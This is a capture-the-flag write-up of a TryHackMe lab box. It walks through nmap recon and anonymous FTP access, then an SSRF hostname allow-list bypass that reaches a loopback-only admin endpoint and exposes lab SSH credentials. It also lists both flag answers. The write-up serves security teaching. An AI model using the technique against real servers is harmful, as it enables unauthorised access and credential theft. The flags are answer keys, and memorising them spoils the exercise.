# TryHackMe: Operation Coldstart

**Category:** Web Exploitation / Full-Box CTF
**Tooling:** Nmap, ftp, pspy, Python HTTP server
**Techniques:** Anonymous FTP enumeration, source code disclosure, SSRF via hostname allow-list bypass, local admin endpoint access, process monitoring for privilege escalation

---

## Overview

Volt Labs' old staging server was left exposed. The engagement traces a full compromise path: an anonymous FTP share leaking a backup archive containing the staging app's Flask source code, an **SSRF vulnerability** in a "URL Preview" feature that only checks hostname (not scheme or localhost-rebind protection) to reach a restricted admin endpoint, and finally privilege escalation using **pspy** to observe scheduled/background process activity.

---

## 1. Recon

**Nmap scan:**
```bash
nmap -sC -sV -A -p- 10.130.132.229
```

Found an FTP service (`vsftpd 3.0.5`) allowing **anonymous login**:
```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

---

### Q1 — Content of user.txt

**Step 1 — Anonymous FTP access:**
```bash
ftp 10.130.132.229
Name: anonymous
```

Browsed to the `pub` directory and downloaded a backup archive:
```
ftp> cd pub
ftp> get backup.tar.gz
```

**Step 2 — Reviewing the leaked source code**

Extracted `app.py`, a Flask app implementing a "URL Preview Service." The key vulnerability is in the `/preview` route:

```python
ALLOWED_HOSTS = {"kestrel.thm"}
...
host = (urlparse(target).hostname or "").lower()
if host not in ALLOWED_HOSTS:
    return page("Preview Blocked", ...), 403

r = requests.get(target, timeout=3)
```

The code only validates the **hostname** against an allow-list — it doesn't check scheme, path, or protect against localhost rebinding. Since `kestrel.thm` resolves to `127.0.0.1` on the box, this is an **SSRF vector limited to the allowed hostname**, but the app also exposes an internal-only admin endpoint restricted by source IP:

```python
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

**Step 3 — Reaching the admin notes via the allowed hostname**

Since `kestrel.thm` is the one hostname the SSRF filter permits, and it resolves locally, requesting:
```
http://kestrel.thm/admin/notes
```
satisfies both the SSRF allow-list AND the admin route's `127.` source-IP check (the request originates from the server itself). This returned internal notes containing SSH credentials:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

Logged in via SSH with these credentials and located `user.txt`.

**Answer:**
```
THM{96dc7bd50d2fb98fcece01560788b5ab}
```

---

### Q2 — Content of flag.txt

Escalated privileges by monitoring running/scheduled processes with **pspy** while a locally-hosted **Python HTTP server** was used to observe or serve payloads as needed during the privesc chain.

**Answer:**
```
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

## Key Lesson

This box is a clean demonstration of how source code disclosure (via a careless anonymous FTP backup) turns an otherwise narrow SSRF vulnerability into full credential exposure. The developer's allow-list check validated only the hostname string, missing that the one permitted hostname (`kestrel.thm`) resolved to loopback — meaning the "restricted" internal admin endpoint was reachable through the exact mechanism meant to prevent arbitrary SSRF. This is a good reminder that hostname-based SSRF allow-lists must also account for what that hostname actually resolves to, not just the string itself.
